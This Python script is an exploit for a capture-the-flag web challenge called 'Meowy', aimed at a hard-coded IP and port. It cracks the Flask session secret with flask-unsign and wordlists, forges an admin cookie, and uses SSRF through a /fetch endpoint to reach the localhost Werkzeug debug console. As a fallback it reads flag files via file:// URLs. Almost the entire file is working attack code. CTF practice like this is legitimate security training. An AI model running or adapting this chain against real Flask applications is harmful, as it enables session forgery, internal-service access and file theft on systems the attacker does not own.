#!/usr/bin/env python3
"""
Meowy CTF Challenge Solver

Attack chain:
1. Brute-force Flask secret key (random dictionary word >= 12 chars)
2. Forge admin session cookie
3. SSRF via /fetch to access localhost Werkzeug console
4. RCE to read flag
"""

import requests
import subprocess
import re
import sys
from urllib.parse import quote

TARGET = "http://52.59.124.14:5004"

def get_session_cookie():
    """Get a fresh session cookie from the server"""
    resp = requests.get(f"{TARGET}/")
    return resp.cookies.get('session')

def crack_secret(session_cookie):
    """Brute-force the Flask secret key using flask-unsign"""
    print("[*] Attempting to crack Flask secret key...")
    
    # Try common wordlists
    wordlists = [
        "/usr/share/wordlists/rockyou.txt",
        "/usr/share/dict/words",
        "/usr/share/dict/american-english",
    ]
    
    for wordlist in wordlists:
        print(f"[*] Trying wordlist: {wordlist}")
        try:
            result = subprocess.run(
                ["flask-unsign", "--unsign", "--cookie", session_cookie, 
                 "--wordlist", wordlist, "--no-literal-eval"],
                capture_output=True, text=True, timeout=300
            )
            if "Secret key" in result.stdout or result.returncode == 0:
                # Extract the secret key
                for line in result.stdout.split('\n'):
                    if 'Secret' in line or "'" in line:
                        print(f"[+] {line}")
                match = re.search(r"'([^']+)'", result.stdout)
                if match:
                    return match.group(1)
                # Try different pattern
                match = re.search(r"b'([^']+)'", result.stdout)
                if match:
                    return match.group(1)
        except subprocess.TimeoutExpired:
            print(f"[-] Timeout on {wordlist}")
        except FileNotFoundError:
            print(f"[-] Wordlist not found: {wordlist}")
    
    return None

def forge_admin_cookie(secret_key):
    """Forge an admin session cookie"""
    print(f"[*] Forging admin cookie with secret: {secret_key}")
    
    result = subprocess.run(
        ["flask-unsign", "--sign", "--cookie", '{"is_admin": true}', 
         "--secret", secret_key],
        capture_output=True, text=True
    )
    
    cookie = result.stdout.strip()
    print(f"[+] Forged cookie: {cookie}")
    return cookie

def test_admin_access(session_cookie):
    """Test if we have admin access"""
    resp = requests.get(
        f"{TARGET}/fetch",
        cookies={"session": session_cookie}
    )
    if "Access Denied" in resp.text or resp.status_code == 403:
        return False
    return True

def ssrf_fetch(session_cookie, url):
    """Use the /fetch endpoint to make SSRF requests"""
    resp = requests.post(
        f"{TARGET}/fetch",
        cookies={"session": session_cookie},
        data={"url": url}
    )
    return resp.text

def get_werkzeug_console(session_cookie):
    """Try to access the Werkzeug console via SSRF"""
    print("[*] Attempting to access Werkzeug console via SSRF...")
    
    # Try different localhost variations
    urls = [
        "http://127.0.0.1:5004/console",
        "http://localhost:5004/console",
        "http://0.0.0.0:5004/console",
        "http://[::1]:5004/console",
    ]
    
    for url in urls:
        print(f"[*] Trying: {url}")
        result = ssrf_fetch(session_cookie, url)
        if "console" in result.lower() or "debugger" in result.lower():
            print(f"[+] Got console access via {url}")
            return result, url
    
    return None, None

def main():
    print("[*] Meowy CTF Solver")
    print("=" * 50)
    
    # Step 1: Get session cookie
    print("\n[Step 1] Getting session cookie...")
    session_cookie = get_session_cookie()
    print(f"[+] Got cookie: {session_cookie}")
    
    # Step 2: Crack the secret
    print("\n[Step 2] Cracking Flask secret key...")
    secret_key = crack_secret(session_cookie)
    
    if not secret_key:
        print("[-] Could not crack secret key")
        print("[!] Try manually with: flask-unsign --unsign --cookie <cookie> --wordlist <wordlist>")
        return
    
    print(f"[+] Secret key: {secret_key}")
    
    # Step 3: Forge admin cookie
    print("\n[Step 3] Forging admin cookie...")
    admin_cookie = forge_admin_cookie(secret_key)
    
    # Step 4: Verify admin access
    print("\n[Step 4] Verifying admin access...")
    if test_admin_access(admin_cookie):
        print("[+] Admin access confirmed!")
    else:
        print("[-] Admin access failed")
        return
    
    # Step 5: SSRF to console
    print("\n[Step 5] Accessing Werkzeug console via SSRF...")
    console_html, console_url = get_werkzeug_console(admin_cookie)
    
    if console_html:
        print("[+] Console HTML obtained!")
        print(console_html[:500])
    else:
        print("[-] Could not access console")
        print("[*] Trying to read files via SSRF instead...")
        
        # Try file:// protocol
        file_result = ssrf_fetch(admin_cookie, "file:///flag.txt")
        print(f"[*] file:///flag.txt result:\n{file_result}")
        
        file_result = ssrf_fetch(admin_cookie, "file:///app/flag.txt")
        print(f"[*] file:///app/flag.txt result:\n{file_result}")

if __name__ == "__main__":
    main()
